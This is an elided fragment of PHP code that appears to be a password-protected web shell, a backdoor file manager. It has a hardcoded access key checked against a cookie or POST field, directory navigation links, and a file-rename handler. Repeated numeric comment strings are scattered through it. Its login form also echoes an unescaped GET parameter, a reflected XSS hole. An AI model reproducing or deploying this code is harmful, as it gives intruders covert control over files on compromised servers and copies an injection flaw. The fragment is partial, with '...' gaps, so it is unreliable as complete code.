...
$auth_key = "a59e63ff4800fea8f8fdebe6c48fc3bd";
...
$pass = false;
if (isset($_COOKIE['pw_name_40920'])) {
    if(($_COOKIE['pw_name_40920']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_40920'])) {
        if(($_POST['pw_name_40920']) == $auth_key) {
            setcookie("pw_name_40920", $_POST['pw_name_40920']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_40920' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726339410712920 1726339410867062 1726339410854053 1726339410595655
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726339410712920 1726339410867062 1726339410854053 1726339410595655
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726339410712920 1726339410867062 1726339410854053 1726339410595655
            $name = PATH . "/" . $_GET['r'];
